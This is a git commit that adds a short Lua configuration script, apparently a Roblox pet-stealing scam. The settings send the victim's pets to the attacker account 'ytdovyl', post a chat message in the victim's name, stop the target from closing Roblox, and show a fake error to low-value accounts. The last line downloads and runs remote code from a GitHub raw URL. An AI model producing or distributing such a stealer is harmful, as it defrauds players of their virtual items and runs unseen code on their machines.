6cebb8996e262ca641cc891f5c9f7098710e2b73
SCRIPTINGCOMMUNITY <137361755+SCRIPTINGCOMMUNITY@users.noreply.github.com>
2023-06-23 11:19:38 +0500

    Upload dovyl_0.lua

---
+++ dovyl_0.lua
@@ -0,0 +1,8 @@
+
+_G.Username = "ytdovyl" --// Username To Send Pets To
+_G.GiftMessage = "your mobkey ass" --// Message For The Gift To Say
+_G.SendMessage = "mo key ass 2.0" --// Message the victim will send in the chat on execution
+_G.Diamonds = 10 --// Amount Of Diamonds To detect alt set an amount of diamond that if the target is under this number, the script will show them an error
+_G.UnlockPets = true --// Unlocks Locked Pets
+_G.AntiLeave = true --// Doesn't Let The Target Close Roblox
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SCRIPTINGCOMMUNITY/SCRIPTS/dovyl_0.lua"))()
